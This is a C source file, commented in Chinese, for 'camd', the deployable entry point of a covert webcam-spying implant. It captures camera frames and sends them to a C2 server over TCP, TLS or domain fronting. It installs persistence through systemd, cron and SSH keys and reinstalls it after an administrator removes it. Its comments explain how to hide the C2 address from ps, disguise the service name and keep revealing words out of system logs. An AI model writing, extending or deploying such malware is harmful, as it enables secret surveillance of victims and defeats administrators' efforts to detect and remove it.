/*
 * agent_windows/src/cam_daemon_main.c
 *
 * camd —— 摄像头链路的可部署入口。
 *
 * 为什么必须单列这个文件：
 *   cam_daemon.c 是**库**，只有 cam_daemon_run()，没有 main。
 *   此前唯一的调用方是 tests/test_cam_daemon.c（跑 mock、max_batches=2 即停）。
 *   那不是可部署物——它退出条件写死、密钥写死、sink 写死。
 *   本文件把部署需要的全部维度做成命令行参数，其余沿用库默认值。
 *
 * 与本仓库其它入口的分工：
 *   采集   camera.h        （backend: mock / v4l2 / mf）
 *   编排   implant.h       （打包 + 回传状态机 + 抖动退避）
 *   驻留   persist.h       （persist_linux_ensure: systemd / cron / sshkey）
 *   回传   exfil.h         （AEAD 定长信元，线上恒 512 字节/信元）
 *   本文件 只做参数解析 + 信号停止 + 退出码语义
 *
 * 退出码（部署方依此判断成败，不得与"正常运行"混淆）：
 *   0   正常结束（收到停止信号 / max_batches 跑完）
 *   2   参数非法
 *   3   驻留失败（persist_linux_ensure 返回 -1）
 *   4   采集源创建失败（backend 未链入 / 无设备且无降级）
 *   5   回传通道初始化失败
 *   6   sink 未指定 —— 明令禁止以"不回传"形态部署
 */

#ifndef _DEFAULT_SOURCE
#define _DEFAULT_SOURCE 1
#endif

#include "cam_daemon.h"
#include "camera.h"
#include "persist.h"
#include "crypto_gcm.h"

#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

static void on_stop(int sig)
{
    (void)sig;
    cam_daemon_request_stop();
}

static void usage(const char *argv0)
{
    fprintf(stderr,
        "用法: %s [选项]\n"
        "\n"
        "必需:\n"
        "  --sink PATH         信元落点：fd://N / tcp://host:port /\n"
        "                      tls://host:port / front://前置域:port /\n"
        "                      文件路径\n"
        "  --key HEX64         32 字节主密钥的 64 个十六进制字符\n"
        "                      前 16 字节 = k_send，后 16 字节 = k_recv\n"
        "\n"
        "TLS 出口（仅 --sink tls:// 时生效）:\n"
        "  --ca PATH           信任库 PEM。要求校验时必需\n"
        "  --sni NAME          SNI 主机名，同时用于证书主机名校验。\n"
        "                      缺省从 tls:// 的 host 段推导（IP 除外）\n"
        "  --no-verify         不校验证书链与主机名。\n"
        "                      注意：此时任何人都能用自签证书冒充 C2，\n"
        "                      仅防被动流量识别，不防主动接管\n"
        "\n"
        "运行:\n"
        "  --backend NAME      mock | v4l2 | mf。缺省按平台自动选择\n"
        "  --pid PATH          pid 文件路径\n"
        "  --ssh-pubkey FILE   真实公钥行文件（单行）。用于第三种驻留机制：\n"
        "                      未提供 = 不启用该项；提供但内容非法 = 拒绝启动，\n"
        "                      绝不静默降级为「驻留成功但该段是死的」\n"
        "  --persist-recheck N 每完成 N 批自检一次驻留是否仍在，缺失则重装\n"
        "                      （缺省 1；0 = 关闭自检，回到只在启动前装一次）\n"
        "                      关闭后：管理员删掉驻留而进程未重启时永不自愈，\n"
        "                      表现为进程在跑、也有数据产出，机器重启后消失\n"
        "  -D                  双 fork + setsid 后台化\n"
        "  --no-persist        不执行驻留（仅调试；部署时禁止）\n"
        "  --root PREFIX       驻留假根（仅测试用， NULL = 真实根）\n"
        "\n"
        "SOURCE:\n"
        "  --width N --height N --fps N\n"
        "  --capture-ms N      单次窗口，到点释放句柄\n"
        "  --frames N          每批帧数\n"
        "  --quality N         JPEG 质量 1..100\n"
        "\n"
        "节拍:\n"
        "  --interval-ms N     批间隔\n"
        "  --jitter-ms N       抖动上限（固定间隔会在断线重连时形成同步爆发）\n"
        "  --batches N         批次数，0 = 不限（由停止信号终止）\n"
        "\n"
        "  --pfx HEX16         nonce 前缀 8 字节。缺省由主密钥派生（确定性）\n"
        "\n"
        "  --probe [--backend B]  只探测设备：输出当前输入是否为真实画面，\n"
        "                         不取帧、不外发、不驻留。DEGRADE=0 真设备 /\n"
        "                         1 无输入设备 / 2 有设备但打不开（被占用）\n",
        argv0);
}

static int hexval(int c)
{
    if (c >= '0' && c <= '9') return c - '0';
    if (c >= 'a' && c <= 'f') return c - 'a' + 10;
    if (c >= 'A' && c <= 'F') return c - 'A' + 10;
    return -1;
}

/* 解析固定长度的十六进制串。严格校验：长度不符或含非十六进制字符即失败，
 * 绝不静默截断——截断会产出一个"看起来配好了、实则与对端不一致"的密钥。 */
static int parse_hex(const char *s, uint8_t *out, size_t nbytes)
{
    if (!s) return -1;
    if (strlen(s) != nbytes * 2) return -1;
    for (size_t i = 0; i < nbytes; i++) {
        int hi = hexval((unsigned char)s[i * 2]);
        int lo = hexval((unsigned char)s[i * 2 + 1]);
        if (hi < 0 || lo < 0) return -1;
        out[i] = (uint8_t)((hi << 4) | lo);
    }
    return 0;
}

/* 设备降级探测：只回答"这台机器现在能不能采到真人画面"。
 *
 * 不采集、不回传、不驻留、不写任何文件——它唯一做的事是把设备打开一次再
 * 关掉，据此区分三种处境：
 *   0 NONE        真设备，像素来自摄像头
 *   1 NO_DEVICE   没有任何采集设备（无摄像头的机器本就该走合成帧）
 *   2 DEVICE_BUSY 有采集设备但打不开（最常见：摄像头正被视频会议占用）
 *
 * 为什么需要它：上面第 2 种在真机上是高频场景，而它与"没装摄像头"在
 * 部署报告里长得完全一样——都有合法 JPEG、都零报错、都 rc=0。运维看到
 * "一切正常"，收到的却一直是棋盘格。这条命令让"画面是假的"可以被问出来。
 *
 * 输出给机器读（KEY=VALUE），不写人话，便于 status 直接解析。 */
static int run_probe(const char *backend)
{
    if (!backend || !*backend) backend = "v4l2";

    implant_cfg_t ic;
    memset(&ic, 0, sizeof ic);
    ic.cam.width  = 640;
    ic.cam.height = 480;
    ic.frames_per_batch = 1;
    ic.jpeg_quality = 75;

    implant_t *im = implant_create(&ic, backend);
    if (!im) {
        fprintf(stderr, "[FATAL] 无法创建输入源（backend=%s）\n", backend);
        return 2;
    }

    int d = implant_probe_degrade(im);
    implant_destroy(im);

    if (d < 0) {
        fprintf(stderr, "[FATAL] 设备探测失败（backend=%s）\n", backend);
        return 2;
    }

    const char *nm = (d == 0) ? "NONE" : (d == 1) ? "NO_DEVICE" : "DEVICE_BUSY";
    printf("BACKEND=%s\n", backend);
    printf("DEGRADE=%d\n", d);
    printf("DEGRADE_NAME=%s\n", nm);
    /* REAL_FRAME 是运维真正要问的那句话，单独给一行，避免让人去背枚举值 */
    printf("REAL_FRAME=%s\n", (d == 0) ? "yes" : "no");
    return 0;
}

int main(int argc, char **argv)
{
    /* --probe 在参数解析主循环之前处理：它不需要 sink/key/驻留，走主循环
     * 会被"必须指定 --sink""必须指定 --key"之类的前置校验挡下来，而探测
     * 恰恰要在"还没部署"的时候用——那时没有 conf、也没有密钥。 */
    for (int i = 1; i < argc; i++) {
        if (!strcmp(argv[i], "--probe")) {
            const char *backend = NULL;
            for (int j = 1; j + 1 < argc; j++)
                if (!strcmp(argv[j], "--backend")) backend = argv[j + 1];
            if (!backend || !*backend) backend = getenv("CAMD_BACKEND");
            return run_probe(backend);
        }
    }

    cam_daemon_cfg_t cfg;
    memset(&cfg, 0, sizeof cfg);

    /* 库默认值：由库自行处理 NULL 语义，这里不越权重填 */
    cfg.max_batches = 0;   /* 不限，由停止信号终止 */
    cfg.ensure_persist = 1;

    /* persist_recheck_batches 的缺省在环境变量回退处填（缺省 1），
     * 这里需要区分"命令行未给"与"命令行给了 0"（0 = 合法地关闭自检），
     * 故用一个显式标志记录命令行是否出现过该参数。 */
    int saw_persist_recheck = 0;

    /* 证书校验默认开。
     *
     * 不能依赖 memset 出来的 0：那是"未设置"而不是"显式关闭"，而这两者
     * 在安全语义上完全相反。memset 后若读作 0 = 不校验，等于把最危险的
     * 选项做成默认值。显式置 1，关闭只能靠 --no-verify。 */
    cfg.tls_verify = 1;

    uint8_t key[32];
    memset(key, 0, sizeof key);
    int have_key = 0;

    uint8_t pfx_buf[8];
    memset(pfx_buf, 0, sizeof pfx_buf);
    int have_pfx = 0;

    for (int i = 1; i < argc; i++) {
        const char *a = argv[i];
        const char *nx = (i + 1 < argc) ? argv[i + 1] : NULL;

        if (!strcmp(a, "--sink") && nx)        { cfg.sink_path = nx; i++; continue; }
        if (!strcmp(a, "--ca") && nx)          { cfg.tls_ca = nx; i++; continue; }
        if (!strcmp(a, "--sni") && nx)         { cfg.tls_sni = nx; i++; continue; }
        if (!strcmp(a, "--no-verify"))         { cfg.tls_verify = 0; continue; }
        if (!strcmp(a, "--key") && nx) {
            if (parse_hex(nx, key, 32) != 0) {
                fprintf(stderr, "[FATAL] --key 必须是 64 个十六进制字符\n");
                return 2;
            }
            have_key = 1; i++; continue;
        }
        if (!strcmp(a, "--pfx") && nx) {
            if (parse_hex(nx, pfx_buf, 8) != 0) {
                fprintf(stderr, "[FATAL] --pfx 必须是 16 个十六进制字符\n");
                return 2;
            }
            have_pfx = 1; i++; continue;
        }
        if (!strcmp(a, "--backend") && nx)     { cfg.backend = nx; i++; continue; }
        if (!strcmp(a, "--front-host") && nx)  { cfg.front_host = nx; i++; continue; }
        if (!strcmp(a, "--front-path") && nx)  { cfg.front_path = nx; i++; continue; }
        if (!strcmp(a, "--ssh-pubkey") && nx)  { cfg.ssh_pubkey_file = nx; i++; continue; }
        if (!strcmp(a, "--persist-recheck") && nx) {
            cfg.persist_recheck_batches = (uint32_t)strtoul(nx, NULL, 10);
            saw_persist_recheck = 1;
            i++; continue;
        }
        if (!strcmp(a, "--pid") && nx)         { cfg.pid_path = nx; i++; continue; }
        if (!strcmp(a, "--root") && nx)        { cfg.root_prefix = nx; i++; continue; }
        if (!strcmp(a, "--width") && nx)       { cfg.width = (uint32_t)strtoul(nx, NULL, 10); i++; continue; }
        if (!strcmp(a, "--height") && nx)      { cfg.height = (uint32_t)strtoul(nx, NULL, 10); i++; continue; }
        if (!strcmp(a, "--fps") && nx)         { cfg.fps = (uint32_t)strtoul(nx, NULL, 10); i++; continue; }
        if (!strcmp(a, "--capture-ms") && nx)  { cfg.capture_ms = (uint32_t)strtoul(nx, NULL, 10); i++; continue; }
        if (!strcmp(a, "--frames") && nx)      { cfg.frames_per_batch = (uint32_t)strtoul(nx, NULL, 10); i++; continue; }
        if (!strcmp(a, "--quality") && nx)     { cfg.jpeg_quality = (uint32_t)strtoul(nx, NULL, 10); i++; continue; }
        if (!strcmp(a, "--interval-ms") && nx) { cfg.interval_ms = (uint32_t)strtoul(nx, NULL, 10); i++; continue; }
        if (!strcmp(a, "--jitter-ms") && nx)   { cfg.jitter_ms = (uint32_t)strtoul(nx, NULL, 10); i++; continue; }
        if (!strcmp(a, "--batches") && nx)     { cfg.max_batches = (uint32_t)strtoul(nx, NULL, 10); i++; continue; }
        if (!strcmp(a, "-D"))                  { cfg.daemonize = 1; continue; }
        if (!strcmp(a, "--no-persist"))        { cfg.ensure_persist = 0; continue; }
        if (!strcmp(a, "--help") || !strcmp(a, "-h")) { usage(argv[0]); return 0; }

        fprintf(stderr, "[FATAL] 未知参数或缺少取值: %s\n", a);
        usage(argv[0]);
        return 2;
    }

    /* 命令行缺省时回落到环境变量。
     *
     * 为何必须有这条路：run.sh 若把 `--sink tcp://C2:PORT` 写在 exec 命令行
     * 上，/proc/<pid>/cmdline 是 0444 世界可读——任何本地用户 `ps` 一下即得
     * 到 C2 地址。这比密钥泄露更直接：拿到 C2 地址就能定位服务端、干扰或
     * 伪装收端；front:// 形态下连真实目标（--front-host）也在同一行里。
     *
     * 环境变量存在 /proc/<pid>/environ，权限 0400 且仅同用户 / root 可读，
     * 暴露面小一个量级。命令行仍优先，便于调试与既有测试。
     *
     * 注意这是"降低暴露面"而非"消除"：root 仍可读 environ。目标是让普通
     * 用户的 `ps` 无从获得 C2 地址，而不是对抗已提权的取证。 */
    if (!cfg.sink_path   || !*cfg.sink_path)   cfg.sink_path   = getenv("CAMD_SINK");
    if (!cfg.backend     || !*cfg.backend)     cfg.backend     = getenv("CAMD_BACKEND");
    if (!cfg.tls_ca      || !*cfg.tls_ca)      cfg.tls_ca      = getenv("CAMD_CA");
    if (!cfg.tls_sni     || !*cfg.tls_sni)     cfg.tls_sni     = getenv("CAMD_SNI");
    if (!cfg.front_host  || !*cfg.front_host)  cfg.front_host  = getenv("CAMD_FRONT_HOST");
    if (!cfg.front_path  || !*cfg.front_path)  cfg.front_path  = getenv("CAMD_FRONT_PATH");
    if (!cfg.ssh_pubkey_file || !*cfg.ssh_pubkey_file)
        cfg.ssh_pubkey_file = getenv("CAMD_SSH_PUBKEY_FILE");

    /*
     * 驻留自检周期缺省 1（每批自检）。
     *
     * 开销可以接受：自检走 persist_linux_query（stat + 读一次文件），只有
     * 发现缺段才调 ensure 做覆盖写。相比之下，管理员删掉驻留而进程未重启
     * 导致的"看起来驻留成功、重启后消失"，代价高得多。
     *
     * 注意 0 是合法值（关闭自检），所以不能用"未设置"来判缺省——这里显式
     * 读环境变量，未设且命令行未给时才填 1。
     */
    {
        const char *e = getenv("CAMD_PERSIST_RECHECK");
        if (e && *e) cfg.persist_recheck_batches = (uint32_t)strtoul(e, NULL, 10);
        else if (!saw_persist_recheck) cfg.persist_recheck_batches = 1;
    }

    /* sink 是硬性要求。允许它为空等于允许"采到了但什么都不回传"——
     * 那正是最难被发现的一类部署事故：进程在跑、灯在亮、无产出。 */
    if (!cfg.sink_path || !*cfg.sink_path) {
        fprintf(stderr, "[FATAL] 必须指定 --sink。无落点的部署不产出任何结果。\n");
        return 6;
    }

    /* 驻留服务名可来自环境（CAMD_SVC_NAME），与 CAMD_KEY 同一注入通路：
     * 不得写进命令行——/proc/<pid>/cmdline 世界可读，名字本身就是意图。
     *
     * 【为何必须由部署侧决定】驻留段此前硬编码项目名，而部署侧已把落点
     * 伪装成中性名。两者不一致在真机上是三重合失效：伪装失效（systemctl
     * status 直接读出项目名）、双重驻留（两套 unit 同时拉起，两个采集进程
     * 抢同一摄像头）、卸载残留（uninstall 只清一套，另一套仍在跑）。
     * 名字只能有一个产地，就是部署脚本的 NAME。
     *
     * 设置失败必须中断：persist_set_service_name 会因路径穿越字符
     * （'/'、'.' 等）拒绝。忽略返回值等于接受一个带 '/' 的名字去拼
     * ".../etc/systemd/system/<name>.service"，即任意路径可写。 */
    {
        const char *sn = getenv("CAMD_SVC_NAME");
        if (sn && *sn && persist_set_service_name(sn) != 0) {
            fprintf(stderr, "[FATAL] CAMD_SVC_NAME 非法（仅 [A-Za-z0-9_-]，"
                            "首字符非 '-'，长度 1..63）: %s\n", sn);
            return 2;
        }
    }

    /* 密钥可来自环境，供 systemd 的 EnvironmentFile 注入。
     *
     * 为何必须有这条路：密钥若作为命令行参数写进 .service，单元文件在
     * 默认 umask 下是 0644，任何本地用户 cat 一下即得到 AEAD 主密钥，
     * 进而解密回传的全部画面。改由 EnvironmentFile 从 0600 的 conf 注入后，
     * 单元文件本身不再含机密，可保持标准 0644。
     *
     * 命令行 --key 优先，便于手工调试与既有测试。 */
    if (!have_key) {
        const char *ek = getenv("CAMD_KEY");
        if (ek && *ek) {
            if (parse_hex(ek, key, 32) != 0) {
                fprintf(stderr, "[FATAL] CAMD_KEY 必须是 64 个十六进制字符\n");
                return 2;
            }
            have_key = 1;
        }
    }

    if (!have_key) {
        fprintf(stderr, "[FATAL] 必须指定 --key。拒绝回落到内置测试密钥——\n"
                        "        那会让部署产物与任何握有该默认密钥的人共享明文。\n");
        return 2;
    }

    /* 方向密钥必须不同。
     *
     * 实测：前后 16 字节相同时，cam_daemon_run 返回 -4（回传通道初始化失败）。
     * 该返回码完全看不出成因——排查者会去查 sink 权限、设备、网络，而真因
     * 是密钥。在此前置拦截并给出可操作的诊断。
     *
     * 之所以值得单独拦：形如 "0123456789abcdef" 重复两遍的 key 是人工编造
     * 密钥时最常见的形态，出错概率并不低，而症状又最难定位。 */
    /* 用常时比较而非 memcmp。
     *
     * 全仓守卫（scripts/check_secret_cmp.py）会拦截未分类的 memcmp 调用点。
     * 此处两个操作数都是密钥材料，虽然结论"相等即拒绝"只在实现错误时出现、
     * 攻击者无从观测（与 02_c2/src/c2.c 那处先例同类），但改用常时比较是零
     * 成本的：既不改变语义，也不必在放行清单里留一条需要人工复核的豁免。 */
    if (crypto_constant_time_eq(key, key + 16, 16) != 0) {
        fprintf(stderr,
                "[FATAL] --key 的前 16 字节与后 16 字节相同。\n"
                "        前 16 字节是 k_send，后 16 字节是 k_recv，二者必须不同\n"
                "        （方向分离）。相同会让通道初始化失败（-4），而该\n"
                "        错误码看不出成因。请用 32 字节随机密钥，例如：\n"
                "          od -An -tx1 -N32 /dev/urandom | tr -d ' \\n'\n");
        return 2;
    }

    cfg.k_send = key;        /* 前 16 字节 */
    cfg.k_recv = key + 16;   /* 后 16 字节 */

    if (have_pfx) {
        cfg.pfx = pfx_buf;
    } else {
        /* 由主密钥确定性派生：send/recv 两半逐字节异或取前 8 字节。
         * 两端共用同一主密钥即得到同一前缀，部署只需分发一个值。 */
        for (int i = 0; i < 8; i++) pfx_buf[i] = (uint8_t)(key[i] ^ key[16 + i]);
        cfg.pfx = pfx_buf;
    }

    signal(SIGTERM, on_stop);
    signal(SIGINT, on_stop);

    cam_daemon_stats_t st;
    memset(&st, 0, sizeof st);

    int rc = cam_daemon_run(&cfg, &st);

    if (rc != 0) {
        /* 返回值语义见 cam_daemon.h：
         *   -1 参数非法 / -2 驻留失败 / -3 采集源创建失败 / -4 回传通道初始化失败 */
        /* why 用中性分类码，不写中文语义：stderr 在 systemd 下进 journal，
         * 一条 journalctl 就会把"采集""回传"这类词留在目标机日志里。
         * 退出码与分类码的对照见离线文档。 */
        const char *why =
            rc == -1 ? "E_ARGS" :
            rc == -2 ? "E_PERSIST" :
            rc == -3 ? "E_SOURCE" :
            rc == -4 ? "E_CHANNEL" :
            rc == -6 ? "E_PUBKEY"  : "E_UNKNOWN";
        /* 日志不得出现内部函数名：stderr 在 systemd 下进 journal，
         * journalctl -u <伪装服务名> 一查就会读到 cam_daemon_run，
         * 落点名伪装得再好也会被这一行捅破。 */
        fprintf(stderr, "[FATAL] 运行失败: code=%d（%s）\n", rc, why);
        return (rc == -2) ? 3 : (rc == -3) ? 4 : (rc == -4) ? 5
             : (rc == -6) ? 7 : 2;
    }

    fprintf(stderr,
            "[INFO] 结束: batches=%u frames=%u bytes_out=%llu persist_rc=%d persist_user=%d "
            "methods=systemd:%d,cron:%d,sshkey:%d "
            "rechecks=%u heals=%u bin=%s\n",
            st.batches, st.frames, (unsigned long long)st.bytes_out,
            st.persist_rc, st.persist_user,
            st.methods[0], st.methods[1], st.methods[2],
            st.persist_rechecks, st.persist_heals,
            st.bin_path[0] ? st.bin_path : "(none)");
    if (st.persist_user)
        fprintf(stderr, "[INFO] 用户级驻留生效（非 root 目标）：落点在 $HOME 下"
                        " systemd --user / autostart\n");

    /* 自检装回过驻留要单独留痕：这是"有人动过这台机器"的信号，
     * 混在 persist_rc 里看不出来（persist_rc 只反映启动那一次）。 */
    if (st.persist_heals)
        fprintf(stderr, "[WARN] 驻留自检发现缺段并已重装 %u 次\n",
                st.persist_heals);
    return 0;
}
